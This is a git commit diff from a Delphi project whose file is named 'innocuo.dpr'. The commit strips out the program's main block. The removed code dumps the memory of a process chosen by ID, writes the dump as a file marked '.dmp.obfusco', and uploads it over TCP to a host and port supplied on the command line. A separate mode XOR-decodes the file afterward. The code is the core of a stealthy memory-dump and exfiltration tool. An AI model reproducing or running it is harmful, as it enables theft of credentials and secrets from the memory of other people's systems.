6def6a3d89017ca65b8e73b99668ebfbec068928
foxlox <fox@thebrain.net>
2023-07-08 09:28:16 +0200

    truncated

--- innocuo.dpr
+++ innocuo.dpr
@@ -13,31 +13,4 @@ key:string;
 
 var idTCPClient         : TIdTCPClient;
 
-begin
-  try
-    if LowerCase(paramstr(1))='xor' then
-    begin
-
-     key:='FF';
-     if xorfile(paramstr(2),ExtractFileName(paramstr(2))+'.noxor',strtoint('$'+key) )=true
-       then writeln('Done!')
-       else writeln('Error decoding file');
-    end
-    else
-     begin
-      dumpprocess(strtoint(paramstr(1))); //15156
-      if paramstr(2)<>'' then
-       begin
-        idTCPClient                 := TIdTCPClient.Create();
-        idTCPClient.Host            := paramstr(2);
-        idTCPClient.Port            := strtoint(paramstr(3));
-        IdTCPClient.Connect;
-        idTCPClient.IOHandler.WriteFile(paramstr(1)+'.dmp.obfusco');
-        idTCPClient.Disconnect;
-       end;
-     end;
-  except
-    on E: Exception do
-      Writeln(E.ClassName, ': ', E.Message);
-  end;
-end.
+[...truncated...]
